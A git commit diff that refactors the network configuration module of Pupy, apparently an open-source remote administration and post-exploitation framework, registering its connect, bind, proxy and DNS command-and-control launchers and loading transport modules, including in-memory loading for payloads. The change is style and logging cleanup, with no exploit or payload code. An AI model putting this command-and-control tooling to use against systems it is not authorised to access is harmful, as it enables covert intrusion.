a6cb54c403e5accb4698312716bbfb847b75f70d
Oleksii Shevchuk <alxchk@gmail.com>
2018-02-09 23:39:16 +0200

    Rework network.conf

--- pupy/network/conf.py
+++ pupy/network/conf.py
@@ -1,36 +1,49 @@
 # -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
-# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
+# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root
+# of the project for the detailed licence terms
 
-import logging, pkgutil, traceback
+import logging
+import importlib
+
 from .lib.launchers.connect import ConnectLauncher
 from .lib.launchers.auto_proxy import AutoProxyLauncher
 from .lib.launchers.bind import BindLauncher
+
+launchers = {
+    'connect': ConnectLauncher,
+    'auto_proxy': AutoProxyLauncher,
+    'bind': BindLauncher,
+}
+
 try:
     from .lib.launchers.dnscnc import DNSCncLauncher
-except Exception as e:
-    logging.warning("%s: DNSCncLauncher disabled"%(str(e)))
-    DNSCncLauncher=None
-import importlib
+    launchers.update({
+        'dnscnc': DNSCncLauncher
+    })
 
-transports={}
-launchers={}
+except Exception as e:
+    logging.exception('{}: DNSCncLauncher disabled'.format(e))
+    DNSCncLauncher = None
+
+transports = {}
+
 def add_transport(module_name):
     try:
-        confmodule=importlib.import_module("network.transports."+module_name+".conf")
-        if not hasattr(confmodule,"TransportConf"):
-            logging.error("No class TransportConf in transport network.transports.%s"%module_name)
+        confmodule = importlib.import_module('network.transports.'+module_name+'.conf')
+        if not hasattr(confmodule, 'TransportConf'):
+            logging.error('No class TransportConf in transport network.transports.%s'%module_name)
             return
-        t=confmodule.TransportConf
+
+        t = confmodule.TransportConf
         if t.name is None:
-            logging.warning("Transport %s has no defined attribute name. using package name as a fallback"%module_name)
-            t.name=module_name
+            t.name = module_name
 
-        transports[t.name]=t
-        logging.debug("[+] transport %s loaded"%t.name)
-    except:
-        logging.warning("Could not load transport %s : %s. Transport disabled"%(module_name,traceback.format_exc()))
+        transports[t.name] = t
+        logging.debug('Transport loaded: {}'.format(t.name))
 
+    except Exception, e:
+        logging.warning('Transport disabled: {}: {}'.format(module_name, e))
 
 #importing from memory (used by payloads)
 try:
@@ -41,19 +54,17 @@ try:
             if x.startswith('network/transports/') and x.endswith(
                 ('/conf.py', '/conf.pyc', '/conf.pyo'))
         ]:
+
         try:
-            module_name=path.rsplit('/',2)[1]
+            module_name = path.rsplit('/',2)[1]
             add_transport(module_name)
+
         except Exception as e:
-            pass
+            logging.exception('Transport failed: {}: {}'.format(module_name, e))
+
 except Exception as e:
     import transports as trlib
-    #imports for pupygen and the pupysh server
+    import pkgutil
+
     for loader, module_name, is_pkg in pkgutil.iter_modules(trlib.__path__):
         add_transport(module_name)
-
-launchers["connect"]=ConnectLauncher
-launchers["auto_proxy"]=AutoProxyLauncher
-launchers["bind"]=BindLauncher
-if DNSCncLauncher:
-    launchers["dnscnc"]=DNSCncLauncher
